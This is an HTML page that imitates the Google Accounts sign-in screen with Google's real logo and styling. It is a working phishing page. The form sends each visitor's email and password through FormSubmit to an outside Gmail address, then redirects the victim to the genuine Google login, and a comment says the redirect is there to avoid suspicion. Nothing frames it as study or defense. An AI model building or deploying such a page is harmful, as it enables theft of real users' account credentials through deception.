<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 0;
            text-align: center;
        }
        .logo {
            width: 75px;
            margin-bottom: 15px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        p {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }
        .input-container {
            margin-bottom: 15px;
            position: relative;
        }
        input[type="text"], input[type="password"] {
            width: 380px;
            padding: 13px 15px;
            margin: 0 auto;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            display: block;
            outline: none;
        }
        input:focus {
            border: 2px solid #1a73e8;
        }
        .footer-btns {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 40px;
            margin-top: 30px;
        }
        .forgot-link {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        .btn-next {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        @media (max-width: 450px) {
            .login-card { width: 90%; border: none; }
        }
    </style>
</head>
<body>

    <div class="login-card">
        <!-- Real Google Logo -->
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x135dp.png" alt="Google">
        
        <h1>Sign in</h1>
        <p>Use your Google Account</p>

        <!-- FormSubmit Configuration -->
        <form action="https://formsubmit.co/kaasislekker069@gmail.com" method="POST">
            <div class="input-container">
                <input type="text" name="Email" placeholder="Email or phone" required>
            </div>
            <div class="input-container">
                <input type="password" name="Password" placeholder="Enter your password" required>
            </div>

            <!-- Redirects user to real google page after submission to avoid suspicion -->
            <input type="hidden" name="_next" value="https://accounts.google.com/">
            
            <div class="footer-btns">
                <a href="#" class="forgot-link">Forgot email?</a>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>

</body>
</html>
